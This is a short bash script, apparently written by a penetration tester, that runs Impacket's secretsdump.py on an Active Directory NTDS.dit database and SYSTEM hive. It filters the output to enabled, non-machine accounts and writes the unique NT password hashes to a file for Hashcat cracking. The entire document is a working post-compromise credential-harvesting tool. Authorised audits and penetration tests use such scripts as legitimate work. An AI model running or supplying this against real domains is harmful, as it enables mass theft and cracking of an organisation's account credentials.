#!/bin/bash
#NTDS Extractor - Ready for Hash Cat
# Written Bt GrantM - 30/06/21

file=$1

if [[ -f $file ]] && [[ -f SYSTEM ]]
then
	secretsdump.py -system SYSTEM -ntds $file -hashes lmhash:nthash -user-status -outputfile Hashes.txt local
	cat Hashes.txt.ntds | grep -v "\$:" | grep "status=Enabled" | cut -d'(' -f1 > DC_Hashes.txt
	cat DC_Hashes.txt | cut -d':' -f4 | sort -u > Hash_Only.txt
else
	echo " "
	echo "The correct files do not exist in thie Directory"
	echo " "
fi

